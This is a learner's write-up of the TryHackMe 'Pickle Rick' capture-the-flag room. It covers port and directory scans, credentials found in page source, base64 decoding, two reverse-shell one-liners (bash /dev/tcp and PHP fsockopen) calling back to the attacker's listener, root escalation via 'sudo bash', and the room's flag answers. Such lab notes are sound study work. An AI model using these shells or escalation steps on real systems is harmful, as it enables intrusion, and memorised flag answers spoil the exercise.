# Pickle Rick CTF (TryHackMe)
==BEGIN==

/note: i use a walkthrough in most of the second half of the CTF as i took a month's long break from studying cybersecurity and needed to get back into it, so a walkthrough really helped bring back strategies, commands, and new stuff to mind.

Target IP = 10.201.39.149

Task 1

1. What is the first ingredient that Rick needs? ans: mr. meeseek hair

2. What is the second ingredient in Rick’s potion? ans: 1 jerry tear

3. What is the last and final ingredient? 

# Open Ports
Port 22/tcp - ssh
Port 80/tcp - http

# Nmap results:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 19:54 ACST
Nmap scan report for 10.201.39.149
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# GoBuster results:
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.39.149
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              cgi,sh,html,css,js,py,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 315] [--> http://10.201.39.149/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]

```

# Contents of robots.txt
```
"Wubbalubbadubdub"
```
# Contents of /assets

bootstrap.min.css
bootstrap.min.js
fail.gif
jquery.min.js
picklerick.gif
portal.jpg
rickandmorty.jpeg

# ^nothing interesting so far with the images

# Page Source of http://10.201.39.149/
# Found a comment in the HTML

```
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

# Potential Credentials
```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

# Nikto Scan Results
```
 Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.201.39.149
+ Target Hostname:    10.201.39.149
+ Target Port:        80
+ Start Time:         2025-10-04 21:04:48 (GMT9.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
+ /login.php: Admin login page/section found.
+ 8102 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2025-10-04 21:39:31 (GMT9.5) (2083 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

# Investigating /portal.php

it's a login page

within this page is a commands area, seems using `ls` there's some files that are of interest, attempting to view these files does not work due to permissions

investigating the page source of the /portal.php subdirectory, i have found a base64 string

```
<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
```

seems CyberChef doesn't work here, or at least it isnt base64?

did some research, seems its a "nested" base64 string, meaning it needs multiple decodings stacked to figure out what it says, in this case, the string is decoded as:

"rabbit hole"

not useful, but funny!

using a walkthrough on Youtube by John Hammond, i can see the site uses a blacklist of commands that cannot be used

because of this, it does seem `less` works to read files

didn't think of a reverse shell but watching the video did help me realise that, with this command panel, a reverse shell can work

# Reverse Shell (No Walkthrough)

for this i searched up pentestmonkey for a reverse shell, for bash at the least, to see if i can get this working

found this payload: ``` bash -i >& /dev/tcp/10.4.1.222/4444 0>&1 
```

see if it works in the command panel after establishing my netcat listener
```
nc -lvnp 4444
```
didnt seem to work.

i'll try a PHP reverse shell

```
php -r '$sock=fsockopen("10.4.1.222",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

it worked, i'm in

## Exploring the System (No Walkthrough)

explored around a while, found the /home, user dir /rick and found the second ingredient file, it had a space in it so i had to escape it using
```
cat second\ ingredient
```

it outputted the following: "1 jerry tear"

that is the second answer

# Final Stretch, hunt for the final ingredient (Walkthrough Research)

Watching the video of John Hammond on the Pickle Rick CTF, apparently just using 
```
sudo bash
```
is enough to get root access as all commands have no sudo password

watching the video some more and i see in the /root directory, with help from the video, the last ingredient is in the 3rd.txt file

it says: "fleeb juice"

== CTF Completed ==


# Bonus (Walkthrough Research)
in John Hammond's video there is an important script of his he has on his github that i'd like to jot down here, seems it's a payload for a reverse shell

```
#!/bin/bash

source "/opt/pmp/functions.sh"

hide_guake
command "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
ctrl Z
command "stty raw -echo"
command "fg"
command "export TERM=xterm"
```

thats the script, watching the video it seems guake is a type of terminal for bash or shell

seems it's for spawning a stablilized reverse shell thats easier to use.

seems its a python 3 reverse shell from just looking at the code with more commands to follow after, `fg` meaning foreground? not really sure what `stty raw -echo` or `export TERM=xterm` does, will do research on these and learn.

==END==
